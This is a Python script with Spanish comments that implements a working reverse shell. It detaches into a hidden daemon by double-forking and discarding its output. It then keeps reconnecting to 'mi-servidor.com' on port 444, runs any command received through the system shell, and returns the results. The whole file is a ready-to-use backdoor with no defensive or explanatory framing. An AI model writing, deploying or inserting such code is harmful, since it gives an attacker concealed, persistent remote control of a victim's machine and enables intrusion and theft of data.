import socket

import subprocess

import os

import sys

import time

  

# Configuración de la dirección IP y el puerto

LHOST = "mi-servidor.com"

LPORT = 444

BUFFER_SIZE = 1024

  

def daemonize():

    """Convierte el proceso en un daemon."""

    if os.fork():  # Crear un hijo y salir del padre

        sys.exit()

  

    os.setsid()  # Crear una nueva sesión

    if os.fork():  # Crear un hijo y salir del padre

        sys.exit()

  

    # Redirigir la entrada/salida estándar

    sys.stdout = open(os.devnull, 'w')

    sys.stderr = open(os.devnull, 'w')

    sys.stdin = open(os.devnull, 'r')

  

def create_client_socket():

    """Crea un socket y se conecta al servidor."""

    while True:

        try:

            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            client.connect((LHOST, LPORT))

            return client

        except Exception as e:

            print(f"Error al conectar: {e}. Reintentando en 5 segundos...")

            time.sleep(5)  # Espera antes de reintentar la conexión

  

def change_directory(new_dir):

    """Cambia el directorio actual."""

    try:

        os.chdir(new_dir)

        return f"Cambiado a {new_dir}"

    except Exception as e:

        return f"Error al cambiar de directorio: {str(e)}"

  

def execute_command(command):

    """Ejecuta un comando en el sistema y devuelve la salida."""

    try:

        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)

        return output.decode("utf-8")

    except subprocess.CalledProcessError as error:

        return error.output.decode("utf-8")

  

def main():

    """Función principal que gestiona la conexión y ejecución de comandos."""

    while True:

        client = create_client_socket()

  

        while True:

            try:

                data = client.recv(BUFFER_SIZE)

                if not data:

                    print("Conexión cerrada por el servidor, reconectando...")

                    break  # Sal del bucle interno para reconectar

                command = data.decode("utf-8").strip()

                # Manejo del comando 'cd'

                if command.startswith("cd "):

                    new_dir = command.split(" ")[1]

                    response = change_directory(new_dir)

                    client.send(response.encode())

                    continue

                if len(command) > 0:

                    response = execute_command(command)

                    client.send(response.encode())

            except Exception as error:

                print(f"Error: {str(error)}. Reconectando...")

                break  # Sal del bucle interno para reconectar

  

if __name__ == "__main__":

    daemonize()  # Convertir el script en un daemon

    main()